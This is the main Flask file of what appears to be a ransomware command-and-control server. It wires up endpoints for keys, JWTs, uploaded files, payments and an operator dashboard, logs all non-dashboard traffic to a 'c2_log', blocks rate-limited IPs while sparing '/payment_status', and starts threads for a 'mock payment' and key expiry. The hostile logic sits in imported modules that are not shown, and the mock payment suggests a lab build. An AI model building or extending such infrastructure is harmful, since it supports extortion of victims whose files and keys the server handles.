from flask import Flask, jsonify
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
from flask_limiter.errors import RateLimitExceeded
from flask import request
import logging
import sys
import json
from datetime import datetime, timezone
import os
from werkzeug.exceptions import RequestEntityTooLarge
from Extensions import limiter, update_block_ip_list
from C2_Variables import dashboard_log_json, c2_log_json, blocked_ips
# Imprting the blueprints here
from Routes.Key_Endpoints import key_bp
from Routes.JWT_Endpoints import jwt_bp
from Routes.Files_Endpoints import files_bp
from Routes.Payment_Endpoints import payments_bp
from Routes.Dashboard_Endpoints import dashboard_bp

####################################################################################################################

app = Flask(__name__)

app.config['MAX_CONTENT_LENGTH'] = 50 * 1024 * 1024

limiter.init_app(app)

if not os.path.exists(f'{dashboard_log_json}'):
    with open(f'{dashboard_log_json}', 'w') as f:
        f.write('')

if not os.path.exists(f'{c2_log_json}'):
    with open(f'{c2_log_json}', 'w') as f:
        f.write('')

logging.getLogger('werkzeug').setLevel(logging.ERROR)

dashboard_log = logging.getLogger('dashboard_log')
dashboard_log.setLevel(logging.INFO)
dashboard_log.propagate = False

if dashboard_log.hasHandlers():
    dashboard_log.handlers.clear()

dashboard_handler = logging.FileHandler(f'{dashboard_log_json}')
dashboard_handler.setFormatter(logging.Formatter('%(message)s'))
dashboard_log.addHandler(dashboard_handler)

c2_log = logging.getLogger('c2_log')
c2_log.setLevel(logging.INFO)
c2_log.propagate = False

if c2_log.hasHandlers():
    c2_log.handlers.clear()

c2_handler = logging.FileHandler(f'{c2_log_json}')
c2_handler.setFormatter(logging.Formatter('%(message)s'))
c2_log.addHandler(c2_handler)

####################################################################################################################

app.register_blueprint(key_bp)
app.register_blueprint(jwt_bp)
app.register_blueprint(files_bp)
app.register_blueprint(payments_bp)
app.register_blueprint(dashboard_bp)

####################################################################################################################

@app.errorhandler(RequestEntityTooLarge)
def handle_file_too_big(e):
    return jsonify({"error": "File too big"}), 413

@app.errorhandler(RateLimitExceeded)
def ratelimit_handler(e):
    ip = request.remote_addr
    if not request.path.startswith('/payment_status'):
        update_block_ip_list(ip)
    return jsonify(error="rate limit exceeded"), 429

@app.before_request
def check_blocked_ips():
    if request.remote_addr in blocked_ips:
        return jsonify(error="Blocked"), 403

####################################################################################################################

@app.after_request
def log_response(response):
    response_data = {}
    if response.is_json:
        response_data = response.get_json()
    log_entry = {
        "time": datetime.now(timezone.utc).isoformat(),
        "ip": request.remote_addr,
        "method": request.method,
        "endpoint": request.path,
        "status": response.status_code,
        "response": response_data
    }
    log_msg = json.dumps(log_entry)

    if request.path.startswith('/dashboard'):
        dashboard_log.info(log_msg)
    elif request.path.startswith('/static') or request.path.startswith('/favicon.ico'):
        pass
    else:
        c2_log.info(log_msg)

    return response

####################################################################################################################

if __name__ == '__main__':
    # Starting the threading before anything else
    from Database import init_db
    from Threading import start_mock_payment, start_remove_expired_keys

    init_db()
    start_remove_expired_keys()
    start_mock_payment()

    app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False)

####################################################################################################################